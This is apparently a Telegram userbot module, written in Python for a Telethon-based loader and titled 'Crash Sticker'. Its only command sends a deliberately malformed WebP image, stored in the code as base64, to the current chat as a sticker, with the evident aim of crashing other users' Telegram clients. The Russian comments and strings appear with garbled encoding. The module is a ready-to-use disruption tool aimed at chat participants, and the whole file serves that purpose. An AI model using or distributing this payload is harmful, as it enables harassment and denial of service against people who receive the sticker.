# -*- coding: utf-8 -*-
# (c) Barni Crash Sticker Module

from .. import loader
from telethon.tl.types import DocumentAttributeSticker
import base64

@loader.tds
class CrashSticker(loader.Module):
    """–û—Ç–ø—Ä–∞–≤–ª—è–µ—Ç –∫—Ä–∞—à-—Å—Ç–∏–∫–µ—Ä"""
    strings = {"name": "CrashSticker"}

    # –ë–∏—Ç—ã–π webp —Å –º–∏–Ω–∏–º–∞–ª—å–Ω–æ–π –≤–∞–ª–∏–¥–Ω–æ–π —Å—Ç—Ä—É–∫—Ç—É—Ä–æ–π
    DATA = base64.b64decode(
        b"UklGRiIAAABXRUJQVlA4ICAAAADQAgCdASoBAAEAAQAcJaQAA3AA/v///wD///8A////"
        b"AP///wD///8A////AP///wD///8AAAAA"
    )

    async def crashcmd(self, message):
        """–û—Ç–ø—Ä–∞–≤–ª—è–µ—Ç –∫—Ä–∞—à-—Å—Ç–∏–∫–µ—Ä"""
        try:
            await message.client.send_file(
                message.chat_id,
                self.DATA,
                mime_type="image/webp",
                file_name="sticker.webp",
                attributes=[
                    DocumentAttributeSticker(
                        alt="ü§Ø", 
                        stickerset=None,
                        mask=None
                    )
                ],
                force_document=False
            )
        except Exception as e:
            await message.edit(f"–û—à–∏–±–∫–∞: {e}")
